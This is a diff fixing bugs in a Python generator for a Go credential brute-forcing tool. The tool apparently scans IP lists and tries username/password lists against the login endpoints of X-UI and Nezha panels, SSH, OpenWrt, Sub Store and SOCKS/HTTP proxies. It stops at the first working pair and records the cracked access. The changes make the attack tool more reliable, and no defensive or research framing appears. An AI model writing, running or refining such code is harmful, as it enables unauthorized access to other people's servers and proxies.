@@ -137,7 +137,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 
 			if err != nil {
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				checkUrl = fmt.Sprintf("https://%s:%s/login", ip, port)
+				checkUrl := fmt.Sprintf("https://%s:%s/login", ip, port)
 				resp, err = postRequest(ctx2, checkUrl, username, password)
 				cancel2()
 			}
@@ -338,7 +338,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 
 			if err != nil {
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				checkUrl = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
+				checkUrl := fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
 				resp, err = postRequest(ctx2, checkUrl, username, password)
 				cancel2()
 			}
@@ -1353,9 +1353,12 @@ func testProxy(proxyAddr string, outputFile *os.File) {
 
 	timeout := {timeout} * time.Second
 
+	var found bool
 	checkAndFormat := func(auth *proxy.Auth) {
+        if found { return }
 		success, _ := checkConnection(proxyAddr, auth, timeout)
 		if success {
+            found = true
 			var result string
 			if auth != nil && auth.User != "" {
 				result = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
@@ -1376,6 +1379,7 @@ func testProxy(proxyAddr string, outputFile *os.File) {
 			for _, pass := range passwords {
 				auth := &proxy.Auth{User: user, Password: pass}
 				checkAndFormat(auth)
+                if found { return }
 			}
 		}
 	case 3: // Credentials file
@@ -1385,6 +1389,7 @@ func testProxy(proxyAddr string, outputFile *os.File) {
 			if len(parts) == 2 {
 				auth := &proxy.Auth{User: parts[0], Password: parts[1]}
 				checkAndFormat(auth)
+                if found { return }
 			}
 		}
 	}
@@ -2046,6 +2051,8 @@ def check_environment(template_mode):
     go_env = os.environ.copy()
     if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
     if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
+    # **BUG FIX**: Set Go proxy for reliable package downloads
+    go_env['GOPROXY'] = 'https://goproxy.cn,direct'
 
     if not os.path.exists("go.mod"):
         run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)
@@ -2060,7 +2067,13 @@ def check_environment(template_mode):
         sys.stdout.write("    - 正在安装Go模块...")
         sys.stdout.flush()
         for pkg in required_pkgs:
-            run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
+            try:
+                run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
+            except subprocess.CalledProcessError as e:
+                print(f"\n❌ Go模块 '{pkg}' 安装失败。请检查网络或代理设置。")
+                # Do not exit, but inform the user. The compile step will ultimately fail.
+                # This prevents the script from crashing on the NameError later.
+                raise e 
         print(" 完成")
 
     print(">>> 环境依赖检测完成 ✅\\n")
@@ -2069,9 +2082,8 @@ def load_credentials(template_mode, auth_mode=0):
     usernames, passwords, credentials = [], [], []
     
     if template_mode == 7: # Sub Store 模式
-        usernames = ["2cXaAxRGfddmGz2yx1wA"]
-        # ... (rest of the logic is similar and can be simplified)
-        passwords = ["2cXaAxRGfddmGz2yx1wA"]
+        # This logic can be simplified or integrated with the main auth logic
+        usernames, passwords = ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"]
         return usernames, passwords, credentials
 
     if auth_mode == 1: # No credentials
@@ -2130,6 +2142,11 @@ if __name__ == "__main__":
         TEMP_XUI_DIR = "xui_outputs"
         TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
         TEMP_HMFAIL_DIR = "temp_hmfail"
+
+        # **BUG FIX**: Define time_str earlier
+        from datetime import datetime, timedelta, timezone
+        beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
+        time_str = beijing_time.strftime("%Y%m%d-%H%M")
 
         try:
                 if not sys.stdout.isatty():
@@ -2214,7 +2231,6 @@ if __name__ == "__main__":
                 }
 
                 gen_func, extra_args = template_map[TEMPLATE_MODE]
-                # Combine base params with specific args for the function call
                 final_params = {**params, **extra_args}
                 gen_func(**final_params)
                 
@@ -2228,10 +2244,6 @@ if __name__ == "__main__":
                 merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
 
                 run_ipcx()
-
-                from datetime import datetime, timedelta, timezone
-                beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
-                time_str = beijing_time.strftime("%Y%m%d-%H%M")
                 
                 mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS"}
                 prefix = mode_map.get(TEMPLATE_MODE, "result")
